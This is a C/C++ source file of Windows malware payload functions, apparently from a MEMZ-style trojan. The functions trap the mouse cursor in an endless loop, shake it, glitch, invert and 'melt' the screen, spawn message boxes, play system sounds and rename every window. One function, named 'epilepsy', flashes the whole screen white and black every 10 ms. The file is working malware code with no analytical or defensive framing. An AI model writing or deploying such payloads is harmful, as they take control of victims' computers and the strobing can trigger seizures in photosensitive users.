#pragma once

#include "main.h"
#include "msgbox.h"
#include "utils.h"
#include "wintitle.h"

POINT cursor;
int ix = GetSystemMetrics(SM_CXICON) / 2;
int iy = GetSystemMetrics(SM_CYICON) / 2;

void moveMouse()
{
    GetCursorPos(&cursor);
    SetCursorPos(cursor.x + (random() % MOUSESHAKE - MOUSESHAKE / 2),
        cursor.y + (random() % MOUSESHAKE - MOUSESHAKE / 2));
}

void trapMouseForever()
{
    GetCursorPos(&cursor);
    while (1) {
        SetCursorPos(cursor.x, cursor.y);
        Sleep(1);
    }
}

void drawErrorCursor()
{
    GetCursorPos(&cursor);
    DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_EXCLAMATION));
}

void screenGlitch()
{
    int x1 = random() % (w - 1000);
    int y1 = random() % (h - 1000);
    int x2 = random() % (w - 1000);
    int y2 = random() % (h - 1000);
    BitBlt(hdc, x1, y1, w, h, hdc, x2, y2, SRCERASE);
}

void epilepsy()
{
    BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, WHITENESS);
    Sleep(10);
    BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, BLACKNESS);
}

void screenInvert() { BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY); }

void screenTunnel()
{
    StretchBlt(hdc, 50, 50, w - 100, h - 100, hdc, 0, 0, w, h, SRCCOPY);
}

void drawText(const char* text)
{
    int x1 = random() % w;
    int y1 = random() % h;
    RECT rect = { x1, y1, x1, y1 };
    DrawTextA(hdc, text, -1, &rect, DT_NOCLIP);
}

void spawnMsgBox()
{
    CreateThread(NULL, 4096, &ripMessageThread, NULL, NULL, NULL);
}

void payloadEarthquake()
{
    int power = 50;

    HBITMAP screenshot = CreateCompatibleBitmap(hdc, w, h);
    HDC hdc2 = CreateCompatibleDC(hdc);
    SelectObject(hdc2, screenshot);

    BitBlt(hdc2, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    BitBlt(hdc, 0, 0, w, h, hdc2, (random() % power) - (power / 2),
        (random() % power) - (power / 2), SRCCOPY);
    Sleep(50);
    BitBlt(hdc, 0, 0, w, h, hdc2, 0, 0, SRCCOPY);

    DeleteDC(hdc2);
    DeleteObject(screenshot);
}

void melt()
{
    HBITMAP screenshot = CreateCompatibleBitmap(hdc, 500, h);
    HDC hdc2 = CreateCompatibleDC(hdc);
    SelectObject(hdc2, screenshot);

    for (int i = 0; i < 20; i++) {
        int x = random() % w - 20 / 2;
        for (; x % 20 != 0; x++) {
        }

        BitBlt(hdc2, 0, 0, 20, h, hdc, x, 0, SRCCOPY);

        for (int j = 0; j < 20; j++) {
            int depth = sin(j / ((float)20) * 3.14159) * (50);
            StretchBlt(hdc2, j, 0, 1, depth, hdc2, j, 0, 1, 1, SRCCOPY);
            BitBlt(hdc2, j, 0, 1, h, hdc2, j, -depth, SRCCOPY);
        }

        BitBlt(hdc, x, 0, 20, h, hdc2, 0, 0, SRCCOPY);
    }

    DeleteDC(hdc2);
    DeleteObject(screenshot);
}

const unsigned long sounds[] = {
    SND_ALIAS_SYSTEMHAND, SND_ALIAS_SYSTEMEXCLAMATION,
    SND_ALIAS_SYSTEMASTERISK, SND_ALIAS_SYSTEMQUESTION,
    SND_ALIAS_SYSTEMSTART, SND_ALIAS_SYSTEMEXIT
};

void payloadSound()
{
    PlaySoundA((LPCSTR)sounds[random() % 6], GetModuleHandle(NULL),
        SND_ASYNC | SND_ALIAS_ID);
}

void setWinTitle(LPCWSTR t)
{
    wintitle = t;
    EnumChildWindows(GetDesktopWindow(), &EnumChildProc, 0);
}
